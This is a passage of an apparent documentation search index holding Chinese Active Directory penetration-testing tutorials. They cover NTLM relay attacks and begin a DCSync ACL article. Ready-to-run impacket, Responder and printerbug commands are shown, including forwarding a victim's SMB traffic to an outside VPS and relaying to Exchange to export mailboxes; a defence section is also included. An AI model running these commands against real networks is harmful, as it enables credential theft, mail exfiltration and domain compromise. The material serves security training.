\u91cc\u9762\u5c31\u4f1a\u7f13\u5b58(Challenge,CIFS/B)\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u4f1a\u8ba4\u8bc1\u5931\u8d25\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 Relay \u5230\u81ea\u8eab\u4f1a\u5931\u8d25\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2cve-2019-1384-ghost-potato","title":"2\uff09CVE-2019-1384-Ghost Potato","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u7ed5\u8fc7\u4e86 KB957097 \u8865\u4e01\u91cc\u9762\u9650\u5236\u4e0d\u80fd Relay \u56de\u672c\u673a\u7684\u9650\u5236\u3002\u7531\u4e8e\u5728KB957097 \u8865\u4e01\u63aa\u65bd\u91cc\u9762\u8fd9\u4e2a\u7f13\u5b58(Challenge,CIFS/B)\u662f\u6709\u65f6\u6548\u6027\u7684\uff0c\u8fd9\u4e2a\u65f6\u95f4\u662f300 \u79d2\uff0c\u4e5f\u5c31\u662f\u8bf4 300 \u79d2\u540e\uff0c\u7f13\u5b58(Challenge,cifs/B)\u5c31\u4f1a\u88ab\u6e05\u7a7a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5373\u4f7f\u4e3b\u673a A \u548c\u4e3b\u673a B \u662f\u540c\u4e00\u53f0\u4e3b\u673a\uff0c\u90a3\u4e48\u7531\u4e8e\u7f13\u5b58\u5df2\u7ecf\u88ab\u6e05\u9664\uff0c\u90a3\u4e48 lsass \u8fdb\u7a0b\u91cc\u9762\u80af\u5b9a\u6ca1\u6709(Challenge,CIFS/B)\u7f13\u5b58\u3002</p> <p>\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u8be5\u6f0f\u6d1e POC \u57fa\u4e8e impacket \u8fdb\u884c\u4fee\u6539\uff0c\u76ee\u524d\u53ea\u80fd\u652f\u6301\u6536\u5230 http\u534f\u8bae\u8bf7\u6c42\u7684\u60c5\u51b5\u3002\u8be5 poc \u5728 sleep 315 \u79d2\u4e4b\u540e\uff0c\u518d\u53d1\u9001 Type 3 \u8ba4\u8bc1\u6d88\u606f\uff0c\u4e8e\u662f\u5c31\u7ed5\u8fc7\u4e86 KB957097 \u8865\u4e01\u3002\u8be5 poc \u5b9e\u73b0\u7684\u6548\u679c\u662f\u5728\u76ee\u6807\u673a\u5668\u7684\u542f\u52a8\u76ee\u5f55\u4e0a\u4f20\u6307\u5b9a\u7684\u6587\u4ef6\u3002</p> <pre><code>python ntlmrelayx.py -t smb://10.211.55.7 -smb2support --gpotato-startup test.txt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fdb\u884c Ghost Potato \u653b\u51fb\uff0c\u53ef\u4ee5\u770b\u5230\u8ba4\u8bc1\u6210\u529f\u3002</p> <p></p> <p>\u653b\u51fb\u5b8c\u6210\u540e\uff0c\u4f1a\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a test.txt \u6587\u4ef6\uff0c\u5982\u56fe\u6240\u793a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2_1","title":"\uff082\uff09\u57df\u73af\u5883","text":"<p>\u5728\u57df\u73af\u5883\u4e2d\uff0c\u9ed8\u8ba4\u666e\u901a\u57df\u7528\u6237\u53ef\u4ee5\u767b\u5f55\u9664\u57df\u63a7\u5916\u7684\u5176\u4ed6\u6240\u6709\u673a\u5668\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u57df\u7528\u6237\u7684 Net-NTLM Hash Relay \u5230\u57df\u5185\u7684\u5176\u4ed6\u673a\u5668\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1impacket-smbrelayxpy","title":"1\uff09impacket \u4e0b\u7684 smbrelayx.py","text":"<p>\u8fd0\u884c smbrelayx.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u8be5\u811a\u672c\u63a5\u6536\u57df\u7528\u6237\u7684 Net-NTLM Hash\uff0c\u7136\u540e Relay \u5230\u57df\u5185\u5176\u4ed6\u673a\u5668\u6267\u884c\u6307\u5b9a\u547d\u4ee4\u3002</p> <pre><code>python3 smbrelayx.py -h 10.211.55.16 -c whoami\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u63a5\u6536\u6765\u81ea 10.211.55.5 \u7684\u6d41\u91cf\uff0cRelay \u5230 10.211.55.16 \u673a\u5668\uff0c\u6267\u884cwhoami \u547d\u4ee4\u6210\u529f\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2impacket-ntlmrelayxpy","title":"2\uff09impacket \u4e0b\u7684 ntlmrelayx.py","text":"<pre><code>python3 ntlmrelayx.py -t smb://10.211.55.16 -c whoami -smb2support\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u63a5\u6536\u6765\u81ea 10.211.55.5 \u7684\u6d41\u91cf\uff0cRelay \u5230 10.211.55.16 \u673a\u5668\uff0c\u6267\u884cwhoami \u547d\u4ee4\u6210\u529f\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#3responder-multirelaypy","title":"3\uff09Responder \u4e0b\u7684 MultiRelay.py \u811a\u672c","text":"<p>\u8be5\u811a\u672c\u529f\u80fd\u5f3a\u5927\uff0c\u901a\u8fc7 ALL \u53c2\u6570\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u7a33\u5b9a\u7684 shell\uff0c\u8fd8\u6709\u6293\u5bc6\u7801\u7b49\u5176\u4ed6\u529f\u80fd\u3002-t \u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u8981 Relay \u7684\u673a\u5668\u3002</p> <p>\u4f7f\u7528 MultiRelay.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff1a</p> <pre><code>./MultiRelay.py -t 10.211.55.6 -u ALL\n</code></pre> <p>\u7136\u540e\u89e6\u53d1\u76ee\u6807\u7528\u6237\u7684 Net-NTLM Hash\uff0c\u5c06\u5176 Relay \u5230 10.211.55.6 \u673a\u5668\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6267\u884c help \u547d\u4ee4\u53c2\u770b\u5e2e\u52a9\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6293\u53d6\u5185\u5b58\u4e2d\u7684\u5bc6\u7801\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2relay-to-http","title":"2.Relay To HTTP","text":"<p>\u5f88\u591a\u5e94\u7528 HTTP \u670d\u52a1\u4e5f\u652f\u6301 NTLM \u8ba4\u8bc1\uff0c\u56e0\u6b64\u53ef\u4ee5 Relay \u5230 HTTP \u534f\u8bae\u3002\u5e76\u4e14HTTP \u534f\u8bae\u7684\u9ed8\u8ba4\u7b56\u7565\u662f\u4e0d\u7b7e\u540d\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1exchange","title":"1\uff09Exchange \u8ba4\u8bc1","text":"<p>Exchange \u8ba4\u8bc1\u4e5f\u652f\u6301 NTLM SSP \u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 SMB \u6d41\u91cf Relay \u5230Exchange \u7684 EWS \u63a5\u53e3\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdb\u884c\u6536\u53d1\u90ae\u4ef6\u7b49\u64cd\u4f5c\u3002</p> <p>\u4f7f\u7528 ntlmRelayToEWS.py \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff1a</p> <pre><code>python2 ntlmRelayToEWS.py -t https://10.211.55.5/EWS/exchange.asmx -r getFolder -f inbox -v\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u6536\u5230\u4e86\u76ee\u6807\u7528\u6237\u7684 Net-NTLM Hash \u540e\uff0c\u5c06\u5176 Relay \u5230 Exchange \u7684EWS \u63a5\u53e3\u6210\u529f\uff0c\u5e76\u4e14\u6210\u529f\u5bfc\u51fa\u90ae\u4ef6\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5728\u5f53\u524d\u76ee\u5f55\u7684 output/inbox \u76ee\u5f55\u4e0b\u5373\u53ef\u770b\u5230\u4fdd\u5b58\u7684\u90ae\u4ef6\u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2adcs","title":"2\uff09ADCS \u8bc1\u4e66\u6ce8\u518c\u63a5\u53e3","text":"<p>ADCS \u8bc1\u4e66\u670d\u52a1\u7684 HTTP \u63a5\u53e3\u9ed8\u8ba4\u4f7f\u7528\u7684\u662f NTLM \u8ba4\u8bc1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u6d41\u91cf\u4e2d\u7ee7\u5230ADCS \u7684\u8bc1\u4e66\u6ce8\u518c\u63a5\u53e3.</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#3relay-to-ldap","title":"3.Relay To LDAP","text":"<p>\u7531\u4e8e\u57df\u5185\u9ed8\u8ba4\u4f7f\u7528\u7684\u662f LDAP \u534f\u8bae\uff0c\u800c LDAP \u534f\u8bae\u4e5f\u652f\u6301\u4f7f\u7528 NTLM \u8ba4\u8bc1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u6d41\u91cf\u4e2d\u7ee7\u5230 LDAP \u534f\u8bae\uff0c\u8fd9\u4e5f\u662f\u57df\u5185 NTLM Relay \u5e38\u7528\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002\u5e76\u4e14 LDAP \u7684\u9ed8\u8ba4\u7b56\u7565\u662f\u534f\u5546\u7b7e\u540d\uff0c\u800c\u5e76\u4e0d\u662f\u5f3a\u5236\u7b7e\u540d\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u5426\u7b7e\u540d\u662f\u7531\u5ba2\u6237\u7aef\u51b3\u5b9a\u7684\uff0c\u670d\u52a1\u7aef\u8ddf\u5ba2\u6237\u7aef\u534f\u5546\u662f\u5426\u9700\u8981\u7b7e\u540d\u3002</p> <p>\u5982\u4e0b\u662f\u4ece HTTP \u534f\u8bae\u548c SMB \u534f\u8bae Relay \u5230 LDAP \u534f\u8bae\u7684\u4e0d\u540c\uff1a</p> <ul> <li>\u4ece HTTP \u534f\u8bae Relay \u5230 LDAP \u662f\u4e0d\u8981\u6c42\u8fdb\u884c\u7b7e\u540d\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c Relay\uff0c\u5982 CVE-2018-8581\u3002\u57df\u5185\u6700\u65b0\u7684 Relay \u624b\u6cd5\u5c31\u662f\u60f3\u529e\u6cd5\u5c06 HTTP \u7c7b\u578b\u7684\u6d41\u91cf Relay \u5230 LDAP \u534f\u8bae\u3002</li> <li>\u4ece SMB \u534f\u8bae Relay \u5230 LDAP \u662f\u8981\u6c42\u8fdb\u884c\u7b7e\u540d\u7684\uff0c\u8fd9\u65f6\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884cRelay\u3002CVE-2019-1040 \u5c31\u662f\u7ed5\u8fc7\u4e86 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u4f7f\u5f97 SMB \u534f\u8bae Relay \u5230 LDAP \u65f6\u4e0d\u9700\u8981\u7b7e\u540d\uff0c\u4ece\u800c\u53ef\u4ee5\u53d1\u52a8\u653b\u51fb\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#ntlm-relay_1","title":"\u5b9e\u6218\u73af\u5883\u4e0b NTLM Relay \u7684\u5229\u7528","text":"<p>\u5728\u5b9e\u6218\u4e2d\u5229\u7528 NTLM Relay \u7684\u4e00\u5927\u96be\u70b9\u5c31\u662f\u6211\u4eec\u5728 VPS \u76d1\u542c\u4e86\u7aef\u53e3\uff0c\u4f46\u662f\u76ee\u6807\u673a\u5668\u7684\u6d41\u91cf\u4e2d\u7ee7\u4e0d\u8fc7\u6765\u3002\u6709\u7684\u4eba\u4f1a\u8bf4\u4e3a\u5565\u4e0d\u5728\u76ee\u6807\u5185\u7f51\u8fdb\u884c\u76d1\u542c\uff1f\u539f\u56e0\u5728\u4e8e\u76d1\u542c\u9700\u8981\u642d\u5efa impacket \u7b49\u73af\u5883\uff0c\u76ee\u6807\u5185\u7f51\u65e0\u6cd5\u642d\u5efa\u8be5\u76d1\u542c\u73af\u5883\u3002\u6240\u4ee5\u76ee\u524d\u6211\u4eec\u7684\u601d\u8def\u662f\uff0c\u5728 VPS \u76d1\u542c\uff0c\u7136\u540e\u5229\u7528\u76ee\u6807\u5185\u7f51\u4e00\u53f0\u51fa\u7f51 Windows \u673a\u5668\u901a\u8fc7\u7aef\u53e3\u8f6c\u53d1\u8fdb\u884c\u4e2d\u7ee7\u6d41\u91cf\u8f6c\u53d1\u5230\u6211\u4eec VPS \u76d1\u542c\u7684\u7aef\u53e3\u4e0a\u3002\u76ee\u524d\u4e5f\u6709\u5982\u4e0b\u89e3\u51b3\u65b9\u6848\uff1a</p> <p></p> <p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/jellever/StreamDivert</p> <p>\u8fd9\u6b3e\u5de5\u5177\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u4e0d\u9700\u8981 CS \u6765\u4f5c\u4e3a\u4e00\u4e2a\u4e2d\u8f6c\uff0c\u76f4\u63a5\u5c06\u76ee\u6807 Windows \u673a\u5668445 \u7684\u6d41\u91cf\u8f6c\u53d1\u7ed9\u6307\u5b9a VPS \u7684\u6307\u5b9a\u7aef\u53e3\u5373\u53ef\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u5728 VPS \u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff0c\u5176\u4e2d\u4fee\u6539\u4e86\u76d1\u542c\u7aef\u53e3\u4e3a 1445</p> <pre><code>proxychains4 -q python3 ntlmrelayx.py -t ldap://10.211.55.4 --no-http-server --no-wcf-server -smb2support --remove-mic --delegate-access --escalate-usermachine\\$ --smb-port 1445\n</code></pre> <p>\u7136\u540e\u5c06\u5982\u4e0b\u6587\u4ef6\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\uff1a</p> <p></p> <p>\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff0c\u5176\u4e2d 81.68.255.200 \u662f VPS \u7684 ip</p> <pre><code>tcp &lt; 445 0.0.0.0 -&gt; 81.68.255.200 1445\n</code></pre> <p>\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>StreamDivert.exe config.txt -f -v\n</code></pre> <p></p> <p>\u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u89e6\u53d1\uff0c\u5176\u4e2d\u9700\u8981\u653b\u51fb\u7684\u76ee\u6807\u662f 10.211.55.9\uff0c\u76ee\u6807\u51fa\u7f51 Windows \u673a\u5668\u662f 10.211.55.10</p> <pre><code>python3 printerbug.py xie/hack:P@ssw0rd@10.211.55.9 10.211.55.10\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec VPS \u8fd9\u8fb9\u5df2\u7ecf\u6536\u5230\u76ee\u6807\u673a\u5668\u7684\u6d41\u91cf\u5e76\u6210\u529f\u5b8c\u6210\u4e86\u4e2d\u7ee7\u4e86\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#ntlm-relay_2","title":"NTLM Relay \u7684\u9632\u5fa1","text":"<p>\u7531\u4e8e\u57df\u5185 NTLM Relay \u653b\u51fb\u6700\u5e38\u89c1\u7684\u5c31\u662f Relay \u5230 LDAP \u534f\u8bae\u6267\u884c\u9ad8\u5371\u9669\u64cd\u4f5c\uff0c\u56e0\u6b64\u9700\u8981\u5bf9 LDAP \u534f\u8bae\u8fdb\u884c\u5b89\u5168\u52a0\u56fa\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u57df\u63a7\u4e0a LDAP \u534f\u8bae\u9ed8\u8ba4\u7b56\u7565\u662f\u534f\u5546\u7b7e\u540d\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u5426\u7b7e\u540d\u662f\u7531\u5ba2\u6237\u7aef\u51b3\u5b9a\u7684\uff0c\u670d\u52a1\u7aef\u8ddf\u5ba2\u6237\u7aef\u534f\u5546\u662f\u5426\u9700\u8981\u7b7e\u540d\u3002\u56e0\u6b64\u8fd9\u5c31\u9020\u6210\u4e86\u5b89\u5168\u9690\u60a3\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u9009\u62e9\u4e0d\u7b7e\u540d\uff01</p> <p></p> <p>\u5fae\u8f6f\u4e8e 2019 \u5e74 9 \u6708\u4efd\u53d1\u5e03\u76f8\u5173\u901a\u544a\u79f0\u5fae\u8f6f\u8ba1\u5212\u4e8e 2020 \u5e74 1 \u6708\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u3002\u4e3a\u4e86\u63d0\u5347\u57df\u63a7\u5236\u5668\u7684\u5b89\u5168\u6027\uff0c\u8be5\u5b89\u5168\u66f4\u65b0\u5c06\u5f3a\u5236\u5f00\u542f\u6240\u6709\u57df\u63a7\u5236\u5668\u4e0a LDAP\u901a\u9053\u7ed1\u5b9a(channel binding) \u4e0e LDAP \u7b7e\u540d\u529f\u80fd\u3002\u5982\u679c\u57df\u63a7\u4e0a\u7684 LDAP \u534f\u8bae\u5f3a\u5236\u5f00\u542f\u4e86\u7b7e\u540d\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c06\u65e0\u6cd5\u5c06\u5176\u4ed6\u6d41\u91cf Relay \u5230 LDAP \u534f\u8bae\u8fdb\u884c\u9ad8\u5371\u9669\u64cd\u4f5c\u4e86\uff01</p> <p>\u4e5f\u53ef\u4ee5\u5c06\u57df\u63a7\u548c Exchange \u7b49\u91cd\u8981\u7684\u670d\u52a1\u5668\u52a0\u5165\"protected Users\"\u7ec4\u4e2d\uff0c\u8fd9\u6837\u8fd9\u4e9b\u670d\u52a1\u5668\u7684\u673a\u5668\u8d26\u53f7\u5c06\u4e0d\u518d\u5141\u8bb8 NTLM \u8ba4\u8bc1\uff0c\u53ea\u5141\u8bb8\u8fdb\u884c Kerberos \u8ba4\u8bc1\u3002</p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html","title":"\u4fee\u6539 DCSync ACL \u653b\u51fb","text":"<p>DCSync \u5168\u79f0\u662f Domain Controller Synchronization\uff08\u57df\u63a7\u5236\u5668\u540c\u6b65\uff09\u3002\u8be5\u540d\u79f0\u63cf\u8ff0\u4e86\u5b83\u7684\u539f\u7406\uff0c\u5373\u653b\u51fb\u8005\u901a\u8fc7\u6a21\u4eff\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u7684\u6b63\u5e38\u540c\u6b65\u8fc7\u7a0b\uff0c\u4ece\u800c\u63d0\u53d6 Active Directory \u4e2d\u7684\u7528\u6237\u51ed\u636e\u6570\u636e\uff0c\u5305\u62ec\u5bc6\u7801\u6563\u5217\u503c\u7b49\u654f\u611f\u4fe1\u606f\u3002</p> <p>\u8fd9\u79cd\u653b\u51fb\u6ee5\u7528\u4e86\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u6b63\u5e38\u7684\u590d\u5236\u529f\u80fd\uff0c\u56e0\u6b64\u5f97\u540d DCSync\u3002</p> <p>\u5728\u57df\u4e2d\uff0c\u4e0d\u540c\u7684 DC \u57df\u63a7\u5236\u5668\u4e4b\u95f4\uff0c\u9ed8\u8ba4\u6bcf\u9694 15 \u5206\u949f\u4f1a\u8fdb\u884c\u4e00\u6b21\u57df\u6570\u636e\u7684\u540c\u6b65\u3002\u5f53\u4e00\u4e2a\u989d\u5916 DC \u57df\u63a7\u5236\u5668\u60f3\u4ece\u5176\u4ed6 DC \u57df\u63a7\u5236\u5668\u540c\u6b65\u6570\u636e\u65f6\uff0c\u989d\u5916 DC \u57df\u63a7\u5236\u5668\u4f1a\u5411\u5176\u4ed6 DC \u57df\u63a7\u5236\u5668\u53d1\u8d77\u8bf7\u6c42\uff0c\u8bf7\u6c42\u540c\u6b65\u6570\u636e\u3002\u5982\u679c\u9700\u8981\u540c\u6b65\u7684\u6570\u636e\u6bd4\u8f83\u591a\uff0c\u5219\u4f1a\u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\u3002DCSync \u5c31\u662f\u5229\u7528\u8fd9\u4e2a\u539f\u7406\uff0c\u901a\u8fc7<code>\u76ee\u5f55\u590d\u5236\u670d\u52a1(DRS\uff0cDirectory Replication Service)</code>\u7684 <code>GetNCChanges</code> \u63a5\u53e3\u5411\u57df\u63a7\u53d1\u8d77\u6570\u636e\u540c\u6b65\u8bf7\u6c42\uff0c\u4ee5\u83b7\u5f97\u6307\u5b9a\u57df\u63a7\u4e0a\u7684\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u3002</p> <p>\u5728 DCSync \u529f\u80fd\u51fa\u73b0\u4e4b\u524d\uff0c\u8981\u60f3\u83b7\u5f97\u57df\u7528\u6237\u7684\u54c8\u5e0c\u7b49\u6570\u636e\uff0c\u9700\u8981\u767b\u5f55\u57df\u63a7\u5236\u5668\uff0c\u5728\u57df\u63a7\u5236\u5668\u4e0a\u6267\u884c\u64cd\u4f5c\u624d\u80fd\u83b7\u5f97\u57df\u7528\u6237\u7684\u6570\u636e\u30022015 \u5e74 8 \u6708\uff0c\u65b0\u7248\u7684mimikatz \u589e\u52a0\u4e86 DCSync \u7684\u529f\u80fd\uff0c\u5b83\u6709\u6548\u5730\u201c\u6a21\u62df\u201d\u4e86\u4e00\u4e2a\u57df\u63a7\u5236\u5668\uff0c\u5e76\u5411\u76ee\u6807\u57df\u63a7\u5236\u5668\u8bf7\u6c42\u5e10\u6237\u5bc6\u7801\u6570\u636e\u3002\u8be5\u529f\u80fd\u6700\u5927\u7684\u7279\u70b9\u5c31\u662f\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e0d\u767b\u5f55\u5230\u57df\u63a7\u4e0a\u800c\u83b7\u53d6\u76ee\u6807\u57df\u63a7\u4e0a\u7684\u6570\u636e\u3002</p> <p>\u6ce8\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e0d\u5141\u8bb8\u4ece\u53ea\u8bfb\u57df\u63a7\u5236\u5668(RODC)\u4e0a\u83b7\u53d6\u6570\u636e\uff0c\u56e0\u4e3a\u53ea\u8bfb\u57df\u63a7\u5236\u5668\u662f\u4e0d\u80fd\u590d\u5236\u540c\u6b65\u6570\u636e\u7ed9\u5176\u4ed6 DC \u57df\u63a7\u5236\u5668\u7684\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#dcsync","title":"DCSync \u5de5\u4f5c\u539f\u7406","text":"<p>DCSync \u662f\u5982\u4f55\u5de5\u4f5c\u7684\u5462\uff0c\u603b\u7684\u6765\u8bf4\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ol> <li>\u5728\u7f51\u7edc\u4e2d\u53d1\u73b0 DC \u57df\u63a7\u5236\u5668</li> <li>\u5229\u7528 Directory Replication Service(DRS)\u670d\u52a1\u7684 GetNCChanges\u63a5\u53e3\u5411\u57df\u63a7\u53d1\u8d77\u6570\u636e\u540c\u6b65\u8bf7\u6c42</li> </ol> <p>\u6211\u4eec\u6765\u770b\u770b\u8be6\u7ec6\u7684\u5de5\u4f5c\u8fc7\u7a0b\uff1a</p> <p>\u5f53\u4e00\u4e2a DC \u57df\u63a7\u5236\u5668(\u6211\u4eec\u79f0\u4e4b\u4e3a\u5ba2\u6237\u7aef)\u5e0c\u671b\u4ece\u53e6\u4e00\u4e2a DC \u57df\u63a7\u5236\u5668(\u6211\u4eec\u79f0\u4e4b\u4e3a\u670d\u52a1\u7aef)\u83b7\u5f97\u6d3b\u52a8\u76ee\u5f55\u5bf9\u8c61\u66f4\u65b0\u65f6\uff0c\u5ba2\u6237\u7aef DC \u4f1a\u5411\u670d\u52a1\u7aef DC \u53d1\u8d77<code>DRSGetNCChanes</code> \u8bf7\u6c42\u3002\u8be5\u8bf7\u6c42\u7684\u54cd\u5e94\u5305\u542b\u4e00\u7ec4\u5ba2\u6237\u7aef\u5fc5\u987b\u5e94\u7528\u4e8e\u5176 NC \u590d\u5236\u526f\u672c\u7684\u66f4\u65b0\u3002\u5982\u679c\u66f4\u65b0\u96c6\u592a\u5927\uff0c\u53ef\u80fd\u53ea\u6709\u4e00\u6761\u54cd\u5e94\u6d88\u606f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u5b8c\u6210\u591a\u4e2a<code>DRSGetNCChanes</code> \u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u88ab\u79f0\u4e3a\u590d\u5236\u5468\u671f\u6216\u7b80\u5355\u7684\u5faa\u73af\u3002</p> <p>\u5f53\u670d\u52a1\u7aef DC \u6536\u5230\u590d\u5236\u540c\u6b65\u8bf7\u6c42\u65f6\uff0c\u7136\u540e\u5bf9\u4e8e\u6267\u884c\u590d\u5236\u7684\u6bcf\u4e2a\u5ba2\u6237\u7aef DC\uff0c\u5b83\u6267\u884c\u4e00\u4e2a\u590d\u5236\u5468\u671f\u3002\u5176\u7c7b\u4f3c\u4e8e\u5728\u5ba2\u6237\u7aef\u4e2d\u4f7f\u7528 DRSGetNCChanes \u8bf7\u6c42\u3002\u6240\u4ee5\u5b83\u4ece\u590d\u5236\u7684\u6bcf\u4e2a DC \u4e2d\u83b7\u5f97\u6700\u65b0\u7684 AD \u5bf9\u8c61\u3002</p> <p><code>\u76ee\u5f55\u590d\u5236\u670d\u52a1(Directory Replication Service\uff0cDRS)\u8fdc\u7a0b\u534f\u8bae</code>\u662f\u4e00\u79cd\u7528\u4e8e\u5728\u6d3b\u52a8\u76ee\u5f55\u4e2d\u590d\u5236\u548c\u7ba1\u7406\u6570\u636e\u7684 RPC \u534f\u8bae\u3002\u8be5\u534f\u8bae\u7531\u4e24\u4e2a RPC \u63a5\u53e3\u7ec4\u6210\uff0c\u5206\u522b\u4e3a<code>drsuapi</code> \u548c <code>dsaop</code>\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#dcsync-acl_1","title":"\u4fee\u6539 DCSync ACL \u653b\u51fb","text":"<p>\u90a3\u4e48\uff0c\u5230\u5e95\u4ec0\u4e48\u7528\u6237\u624d\u5177\u6709\u8fd0\u884c DCSync \u7684\u6743\u9650\u5462\uff1f\u80fd\u4e0d\u80fd\u901a\u8fc7\u4fee\u6539\u666e\u901a\u7528\u6237\u7684 ACL \u4f7f\u5176\u83b7\u5f97 DCSync \u7684\u6743\u9650\u5462\uff1f\u5e26\u7740\u8fd9\u4e2a\u7591\u95ee\uff0c\u6211\u4eec\u5f80\u4e0b\u770b\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#1-dcsync","title":"1.\u5177\u5907 DCSync \u6743\u9650\u7684\u7528\u6237","text":"<p>\u8fd0\u884c DCSync \u9700\u8981\u5177\u6709\u7279\u6b8a\u7684\u6743\u9650\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u4ee5\u4e0b\u7ec4\u4e2d\u7684\u7528\u6237\u5177\u6709\u8fd0\u884c DCSync \u7684\u6743\u9650\uff1a</p> <ul> <li>Administrators \u7ec4\u5185\u7684\u7528\u6237</li> <li>Domain Admins \u7ec4\u5185\u7684\u7528\u6237</li> <li>Enterprise Admins \u7ec4\u5185\u7684\u7528\u6237</li> <li>\u57df\u63a7\u5236\u5668\u8ba1\u7b97\u673a\u5e10\u6237</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 adfind \u67e5\u8be2\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u57df\u5185\u5177\u5907 DCSync \u6743\u9650\u7684\u7528\u6237\u3002</p> <pre><code>AdFind.exe -s subtree -b \"DC=xie,DC=com\" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;\"Replicating Directory Changes\";; -recmute\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#2-dcsync-acl","title":"2.\u4fee\u6539 DCSync ACL","text":"<p>\u6211\u4eec\u5982\u4f55\u80fd\u8ba9\u666e\u901a\u57df\u7528\u6237\u4e5f\u83b7\u5f97 DCSync \u7684\u6743\u9650\u5462\uff1f\u666e\u901a\u60c5\u51b5\u4e0b\uff0c\u53ea\u9700\u8981\u5411\u666e\u901a\u57df\u7528\u6237\u52a0\u5165\u4e0b\u9762\u4e24\u6761 ACE(Access Control 